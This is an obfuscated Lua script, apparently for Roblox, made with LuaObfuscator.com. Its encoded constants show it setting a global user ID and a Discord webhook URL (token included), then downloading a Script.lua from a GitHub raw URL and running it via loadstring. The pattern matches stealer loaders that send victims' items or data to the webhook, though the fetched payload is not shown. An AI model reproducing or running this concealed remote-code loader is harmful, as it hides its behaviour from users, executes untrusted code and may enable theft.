--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v20)if (v1(v20,2)==79) then local v66=0;while true do if (v66==0) then v19=v0(v3(v20,1,1));return "";end end else local v67=0;local v68;while true do if (v67==0) then v68=v2(v0(v20,16));if v19 then local v102=v5(v68,v19);v19=nil;return v102;else return v68;end break;end end end end);local function v21(v22,v23,v24)if v24 then local v69=0 -0 ;local v70;while true do if (v69==(489 -(174 + 315))) then v70=(v22/(((644 -(199 + 444)) + 1)^(v23-(497 -(460 + 36)))))%((1250 -(5 + 1242 + 1))^(((v24-(3 -(4 -2))) -(v23-(1230 -(103 + (2480 -(703 + 651)))))) + (290 -((489 -304) + 104)))) ;return v70-(v70%(1 + 0)) ;end end else local v71=0 -0 ;local v72;while true do if ((1383 -(834 + 549))==v71) then v72=2^(v23-1) ;return (((v22%(v72 + v72))>=v72) and 1) or (1048 -(125 + 923)) ;end end end end local function v25()local v38=0;local v39;while true do if (v38==(1 + 0)) then return v39;end if (v38==((1607 -(994 + 613)) -0)) then v39=v1(v16,v18,v18);v18=v18 + (1690 -(144 + 1545)) ;v38=2 -1 ;end end end local function v26()local v40,v41=v1(v16,v18,v18 + (4 -2) );v18=v18 + (1987 -(1485 + 500)) ;return (v41 * 256) + v40 ;end local function v27()local v42,v43,v44,v45=v1(v16,v18,v18 + (4 -1) );v18=v18 + 4 ;return (v45 * 16777216) + (v44 * (192132 -126596)) + (v43 * (1283 -(304 + 723))) + v42 ;end local function v28()local v46=v27();local v47=v27();local v48=3 -2 ;local v49=(v21(v47,1 + 0 ,1135 -(533 + 582) ) * (2^(122 -90))) + v46 ;local v50=v21(v47,(62 -48) + 7 ,81 -50 );local v51=((v21(v47,(24 + 394) -(15 + 371) )==(1960 -(957 + 860 + 142))) and  -(1 + 0)) or (601 -(436 + 164)) ;if (v50==(29 -(7 + 22))) then if (v49==0) then return v51 * (0 + 0) ;else v50=3 -2 ;v48=565 -((1682 -1225) + 108) ;end elseif (v50==((6355 -(158 + 438)) -3712)) then return ((v49==0) and (v51 * ((2 -1)/0))) or (v51 * NaN) ;end return v8(v51,v50-(2559 -(335 + 1201)) ) * (v48 + (v49/((3 -1)^52))) ;end local function v29(v30)local v52=0 -(943 -(261 + 682)) ;local v53;local v54;while true do if (v52==(612 -(106 + 344 + (855 -(654 + 40))))) then v53=v3(v16,v18,(v18 + v30) -1 );v18=v18 + v30 ;v52=2;end if (v52==(2 + 0)) then v54={};for v79=893 -((986 -441) + 347) , #v53 do v54[v79]=v2(v1(v3(v53,v79,v79)));end v52=150 -(104 + 43) ;end if (v52==(3 + 0)) then return v6(v54);end if (v52==(0 + 0)) then v53=nil;if  not v30 then local v86=(0 -0) -0 ;while true do if (v86==(0 + 0)) then v30=v27();if (v30==((5120 -3339) -(1343 + 438))) then return "";end break;end end end v52=706 -((476 -(247 + 198)) + 674) ;end end end local v31=v27;local function v32(...)return {...},v12("#",...);end local function v33()local v55=1439 -(178 + 1261) ;local v56;local v57;local v58;local v59;local v60;local v61;while true do if (v55==1) then v59={v56,v57,nil,v58};v60=v27();v61={};v55=2 + 0 ;end if (v55~=0) then else v56={};v57={};v58={};v55=1;end if (v55==(3 + 0)) then local v73=429 -(345 + 84) ;local v74;while true do if (v73==0) then v74=0 -0 ;while true do if (v74==1) then return v59;end if (v74==0) then local v119=0;while true do if ((1117 -(102 + 1014))~=v119) then else v74=1;break;end if (v119~=0) then else for v121=1281 -(227 + 1053) ,v27() do v57[v121-(1 + 0) ]=v33();end for v123=1,v27() do v58[v123]=v27();end v119=1738 -(1428 + 309) ;end end end end break;end end end if (v55==2) then local v75=0 + 0 ;while true do if (v75==1) then for v103=1,v27() do local v104=496 -(303 + 193) ;local v105;local v106;local v107;while true do if (v104~=(0 -0)) then else v105=0;v106=nil;v104=1;end if (v104==1) then v107=nil;while true do if (v105~=0) then else local v125=0 -0 ;while true do if (0~=v125) then else v106=0;v107=nil;v125=4 -3 ;end if (v125~=1) then else v105=1076 -(905 + 170) ;break;end end end if (v105==1) then while true do if (v106==(959 -(137 + 822))) then v107=v25();if (v21(v107,1 -0 ,756 -(663 + 92) )~=(0 + 0)) then else local v131=1453 -(128 + 1325) ;local v132;local v133;local v134;local v135;while true do if (0==v131) then v132=0 + 0 ;v133=nil;v131=1;end if (v131==(2 -1)) then v134=nil;v135=nil;v131=2;end if (v131~=(4 -2)) then else while true do if (v132==(1 + 0)) then local v166=0;while true do if (v166~=(963 -(324 + 639))) then else v135={v26(),v26(),nil,nil};if (v133==(0 -0)) then local v181=0;local v182;local v183;while true do if (v181==(1902 -(672 + 1229))) then while true do if (0~=v182) then else v183=680 -(182 + 498) ;while true do if (v183~=(0 -0)) then else v135[14 -11 ]=v26();v135[4]=v26();break;end end break;end end break;end if (v181~=0) then else v182=0 + 0 ;v183=nil;v181=1;end end elseif (v133==(1 -0)) then v135[3]=v27();elseif (v133==(2 + 0)) then v135[687 -(650 + 34) ]=v27() -(2^(225 -(128 + 81))) ;elseif (v133==3) then local v200=753 -(667 + 86) ;local v201;while true do if (v200==0) then v201=0 + 0 ;while true do if (0==v201) then v135[3]=v27() -(2^(3 + 13)) ;v135[3 + 1 ]=v26();break;end end break;end end end v166=1792 -(1296 + 495) ;end if (v166~=(2 -1)) then else v132=2;break;end end end if (v132==0) then local v167=0 + 0 ;local v168;while true do if ((0 + 0)==v167) then v168=0;while true do if (v168~=0) then else local v191=0;while true do if (v191==1) then v168=1;break;end if ((0 + 0)~=v191) then else v133=v21(v107,1 + 1 ,3);v134=v21(v107,4,10 -4 );v191=2 -1 ;end end end if (v168~=(975 -(248 + 726))) then else v132=1 + 0 ;break;end end break;end end end if (v132~=3) then else if (v21(v134,6 -3 ,3)~=(833 -(524 + 308))) then else v135[42 -(36 + 2) ]=v61[v135[5 -1 ]];end v56[v103]=v135;break;end if (v132==(2 + 0)) then local v170=1463 -(362 + 1101) ;while true do if (v170~=1) then else v132=3;break;end if ((0 + 0)==v170) then if (v21(v134,403 -(31 + 371) ,1 -0 )~=1) then else v135[1229 -(497 + 730) ]=v61[v135[2]];end if (v21(v134,1 + 1 ,1092 -(467 + 623) )~=(1 -0)) then else v135[3]=v61[v135[3]];end v170=1;end end end end break;end end end break;end end break;end end break;end end end v55=704 -(13 + 688) ;break;end if (v75==0) then for v108=108 -(32 + 75) ,v60 do local v109=0 + 0 ;local v110;local v111;local v112;local v113;local v114;while true do if (v109==(1048 -(873 + 174))) then v112=nil;v113=nil;v109=2;end if (v109~=2) then else v114=nil;while true do if (v110~=(0 + 0)) then else local v126=0;while true do if (v126==1) then v110=1235 -(6 + 1228) ;break;end if (0~=v126) then else v111=0 + 0 ;v112=nil;v126=1;end end end if (v110~=(1 + 1)) then else while true do if (v111==0) then local v129=0 -0 ;local v130;while true do if (v129~=0) then else v130=0 + 0 ;while true do if (v130~=0) then else local v165=21 -(8 + 13) ;while true do if (v165==(0 -0)) then v112=0;v113=nil;v165=1 -0 ;end if (v165==1) then v130=1;break;end end end if (v130==(1 + 0)) then v111=1;break;end end break;end end end if (v111==(1911 -(675 + 1235))) then v114=nil;while true do if (v112~=(939 -(37 + 901))) then else if (v113==1) then v114=v25()~=(0 + 0) ;elseif (v113==(1339 -(456 + 881))) then v114=v28();elseif (v113==3) then v114=v29();end v61[v108]=v114;break;end if (0==v112) then local v148=0 + 0 ;local v149;while true do if (v148~=0) then else v149=0;while true do if (v149~=(1 -0)) then else v112=1;break;end if (v149~=0) then else v113=v25();v114=nil;v149=1;end end break;end end end end break;end end break;end if (v110==(1533 -(1070 + 462))) then v113=nil;v114=nil;v110=2;end end break;end if (v109==0) then v110=0;v111=nil;v109=1;end end end v59[3 + 0 ]=v25();v75=1 -0 ;end end end end end local function v34(v35,v36,v37)local v62=0;local v63;local v64;local v65;while true do if (v62==0) then v63=v35[1];v64=v35[2];v62=1;end if (v62==1) then v65=v35[3];return function(...)local v81=1;local v82= -1;local v83={...};local v84=v12("#",...) -1 ;local function v85()local v87=v63;local v88=v64;local v89=v65;local v90=v32;local v91={};local v92={};local v93={};for v98=0 -0 ,v84 do if ((((2446 + 1701) -(155 + (2403 -(1313 + 218))))==(11489 -8369)) and (v98>=v89)) then v91[v98-v89 ]=v83[v98 + (2 -1) ];else v93[v98]=v83[v98 + (1 -0) ];end end local v94=(v84-v89) + 1 + 0 ;local v95;local v96;while true do local v99=0 + 0 ;local v100;while true do if (((5070 -(9 + 183))>=(1143 + 3048)) and ((0 -0)==v99)) then v100=0 + 0 ;while true do if (((23 + 111 + 63)==(17 + 180)) and ((0 + 0)==v100)) then local v120=1648 -(1091 + 557) ;while true do if ((v120==(1194 -(373 + 820))) or ((4012 -(976 + 223))<=(1099 -(139 + (840 -488))))) then v100=2 -1 ;break;end if ((v120==(0 + 0)) or (1117>=3007)) then v95=v87[v81];v96=v95[(2 + 0) -1 ];v120=1 -0 ;end end end if (((4346 -3151)<=(5954 -3960)) and (v100==(1 + 0))) then if ((v96<=((27 + 22) -((547 -(99 + 418)) + 15))) or ((8272 -5500)==(2544 + 630))) then if (((6116 -(473 + 963))>(19650 -15171)) and (v96<=(1 + 0))) then if ((v96>((0 -0) + 0)) or ((4563 -((2608 -(627 + 661)) + 570))<=(3076 -(5278 -3247)))) then if ((v93[v95[1164 -(339 + 823) ]]==v95[2 + 2 ]) or ((2215 + 1900)==(3619 -(1 + 38 + 78 + 36)))) then v81=v81 + (2 -1) ;else v81=v95[1409 -(411 + 995) ];end else local v136=0 + 0 ;local v137;local v138;local v139;while true do if ((v136==(1206 -(895 + 311))) or ((4490 -(831 + 712))<=((6415 -(93 + 1745)) -2900))) then local v161=1980 -(1384 + 596) ;while true do if (((4821 -(1086 + 299))<(2938 + 592)) and (((9 -6) -2)==v161)) then v136=(1389 -(75 + 83)) -(671 + 559) ;break;end if (((2751 -547)==(1855 + 349)) and (v161==(0 + 0))) then v137=0 + 0 ;v138=nil;v161=1067 -((3422 -2624) + 268) ;end end end if ((v136==(1 + 0)) or ((4765 -(25 + 286))<=(1634 + (386 -(140 + 33))))) then v139=nil;while true do if ((v137==(1 + 0)) or (445>(3887 -(1416 + 309)))) then v93[v138 + (2 -1) ]=v139;v93[v138]=v139[v95[3 + 1 ]];break;end if ((v137==(0 + 0)) or ((3494 -(782 + 1097))==(3979 + 615))) then local v174=470 -(444 + 26) ;while true do if ((v174==(0 -0)) or ((9731 -6324)==(873 -368))) then local v180=0 -(0 -0) ;while true do if ((v180==(0 -0)) or ((5853 -1547)<=(6990 -4796))) then v138=v95[(1583 -(525 + 1053)) -3 ];v139=v93[v95[3 -(0 -0) ]];v180=1855 -(340 + 1514) ;end if ((v180==(2 -1)) or (((10640 -6043) -(29 + 853))==(2001 -(1234 + 29)))) then v174=283 -(233 + 49) ;break;end end end if ((v174==(1374 -(262 + 1111))) or ((3376 -(791 + 411))==(2396 -1453))) then v137=1 -0 ;break;end end end end break;end end end elseif (((3989 -(429 + 910))<=((9603 -(140 + 181)) -5768)) and (v96<=(2 + 0))) then v93[v95[2 -0 ]]=v37[v95[900 -(729 + 168) ]];elseif ((v96>(779 -(328 + 448))) or ((1805 -(1994 -(11 + 690)))>=(189 + 845))) then v81=v95[9 -6 ];else local v152=0;local v153;local v154;local v155;local v156;local v157;local v158;while true do if (((2882 + 575)>(228 -117)) and (v152==(1075 -(32 + 1041)))) then v157=nil;v158=nil;v152=3;end if (((5613 -(259 + 801))>=(1292 -(328 + 521))) and (((1858 -(381 + 1477)) -0)==v152)) then v153=0 -0 ;v154=nil;v152=542 -(143 + 199 + 199) ;end if (((7 -4)==v152) or ((2860 -(386 + 530))<(2744 -(602 + 456 + 923)))) then while true do if ((v153==(1517 -(245 + 1272))) or ((3008 -(1417 + 204))<=(1620 -978))) then local v179=0 -(0 -0) ;while true do if (((9393 -4527)>(2368 -(677 + (2320 -(1263 + 687))))) and (v179==(259 -(128 + 130)))) then v153=1;break;end if (((372 + 702)==(3788 -2714)) and (v179==(945 -(923 + 22)))) then v154=0 -0 ;v155=nil;v179=1;end end end if ((v153==(3 -2)) or ((4774 -(1054 + 436))==(2771 -(825 + 263)))) then v156=nil;v157=nil;v153=1107 -(1082 + 23) ;end if ((v153==(1939 -((1871 -(399 + 754)) + 1219))) or ((248 + 589)>(3549 -(527 + 49)))) then v158=nil;while true do if (((1144 + 598)==(3346 -(5661 -4057))) and (v154==(1 + 0))) then local v188=0 + 0 ;local v189;while true do if ((v188==(1942 -(1846 + 96))) or ((2255 -1106)>(2316 + 1038 + 774))) then v189=965 -((1163 -921) + 723) ;while true do if ((v189==1) or (((21043 -15436) -(1300 + 404))<=(4469 -(1738 + 14 + 103)))) then v154=2 + 0 ;break;end if ((v189==(0 + 0)) or ((4825 -2647)<(3434 -(1295 + (441 -(20 + 174)))))) then v82=(v157 + v155) -((7 -4) -2) ;v158=0;v189=1864 -(1024 + 839) ;end end break;end end end if (((2236 -466)<=((194 + 12639) -9273)) and (v154==(3 -(2 -1)))) then for v194=v155,v82 do local v195=0 -0 ;local v196;while true do if (((5036 -(1095 + 341))>(493 + 481)) and (0==v195)) then v196=954 -(236 + 718) ;while true do if ((v196==(0 + 0 + 0)) or ((2650 + 296)<=(1926 -(333 + 453)))) then v158=v158 + (4 -3) ;v93[v194]=v156[v158];break;end end break;end end end break;end if (((3718 -((9 -5) + 571))==((2837 + 516) -(118 + (1388 -(1244 + 52))))) and (v154==(1716 -(232 + 709 + 775)))) then local v190=1979 -(1179 + 800) ;while true do if (((4805 -(17 + 36))==(6697 -(1634 + 311))) and (v190==(1408 -(275 + 1133)))) then v155=v95[4 -2 ];v156,v157=v90(v93[v155](v13(v93,v155 + 1 + 0 ,v95[3 + 0 ])));v190=(663 -(524 + 138)) + 0 ;end if ((v190==(1 + 0)) or ((3627 -(241 + 31))>=(15717 -11236))) then v154=83 -(62 + 11 + 9) ;break;end end end end break;end end break;end if (((1492 + 342)==(1084 + 750)) and (v152==(1 -0))) then v155=nil;v156=nil;v152=1135 -(810 + 323) ;end end end elseif (((4444 -(690 + 814))==(3961 -(923 + 98))) and (v96<=(2 + 1 + 4))) then if (((5346 -1646)==(3971 -(231 + 40))) and (v96<=(4 + 1))) then local v142=0 -0 ;local v143;local v144;while true do if (((1156 + 3817)>(3798 + 278)) and (v142==(805 -((961 -(540 + 60)) + 443)))) then while true do if ((v143==(1967 -((2291 -(244 + 776)) + 696))) or ((503 -127)>=(6649 -(160 + 1816)))) then v144=v95[1013 -(791 + 220) ];v93[v144]=v93[v144](v13(v93,v144 + (2 -1) ,v82));break;end end break;end if ((v142==(0 -0)) or ((261 -204)>=((6766 -(503 + 284)) -4381))) then local v162=0 + 0 ;while true do if (((12736 -8293)>=(11063 -7169)) and (v162==1)) then v142=4 -3 ;break;end if ((v162==(0 + 0)) or ((1443 + 2116)<(118 + 2365))) then v143=0;v144=nil;v162=1529 -(1344 + 184) ;end end end end elseif (((14493 -10388)==(4277 -(125 + 47))) and (v96==(6 + 0))) then v93[v95[2 -0 ]]();else do return;end end elseif ((v96<=(1701 -(512 + 1181))) or (((8546 -6831) + 728)<=(592 + 1099))) then v93[v95[2 + 0 ]][v95[7 -(4 + 0) ]]=v95[1619 -(149 + 556 + 910) ];elseif ((v96==((155 -(68 + 85)) + 7)) or ((1382 + 713)==(4847 -(222 + 503)))) then v93[v95[3 -1 ]]=v95[717 -(371 + 343) ];else for v163=v95[214 -(165 + 47) ],v95[11 -8 ] do v93[v163]=nil;end end v81=v81 + 1 + 0 ;break;end end break;end end end end A,B=v32(v11(v85));if  not A[1] then local v101=v35[4][v81] or "?" ;error("Script error at ["   .. v101   .. "]:"   .. A[2] );else return v13(A,2,B);end end;end end end return v34(v33(),{},v17)(...);end v15("LOL!0B3O00028O00026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033C3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F6B34662O742F52692O7A2F6D61696E2F5363726970742E6C756103023O005F4703063O00557365724944022O008064F9BACB4103073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313039313639363438353439313534303130332F63415F614365414B6453446376587A6C77694734335872552D476369734B4D6C5F42627943774652465F702D6A6F30356336464A454E77575F546E4263684A614377415A00223O0012093O00014O000A000100013O0026013O000200010001002O043O00020001001209000100013O0026010001000F00010002002O043O000F0001001202000200033O001202000300043O00202O000300030005001209000500064O0003000300054O000500023O00022O0006000200010001002O043O002100010026010001000500010001002O043O00050001001209000200013O0026010002001900010001002O043O00190001001202000300073O003008000300080009001202000300073O0030080003000A000B001209000200023O0026010002001200010002002O043O00120001001209000100023O002O043O00050001002O043O00120001002O043O00050001002O043O00210001002O043O000200012O00073O00017O00223O00023O00033O00053O00053O00063O00083O00083O00093O00093O00093O00093O00093O00093O00093O000A3O000C3O000C3O000D3O000F3O000F3O00103O00103O00113O00113O00123O00143O00143O00153O00163O00173O00193O001B3O001C3O001E3O00",v9(),...);end
